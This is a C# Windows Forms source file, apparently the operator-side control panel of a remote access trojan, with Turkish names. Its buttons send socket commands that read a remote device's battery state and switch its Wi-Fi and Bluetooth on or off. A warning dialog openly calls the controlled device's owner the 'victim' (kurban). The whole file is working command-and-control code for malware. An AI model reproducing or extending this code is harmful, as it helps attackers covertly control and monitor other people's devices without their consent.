using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Bilgiler : Form
    {
        Socket sck; public string ID = "";
        public Bilgiler(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("SARJ", "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("WIFI", "[VERI]true[VERI][0x09]", sck);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                if (MessageBox.Show("Bunu yaparsanız kurban ile aranızdaki bağlantı kopabilir. Emin misiniz?",
                    "Uyarı", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    Form1.KomutGonder("WIFI", "[VERI]false[VERI][0x09]", sck);
                    button1.PerformClick();
                }
            }
            catch (Exception) { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("BLUETOOTH", "[VERI]true[VERI][0x09]", sck);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("BLUETOOTH", "[VERI]false[VERI][0x09]", sck);
                button1.PerformClick();
            }
            catch (Exception) { }
        }
    }
}
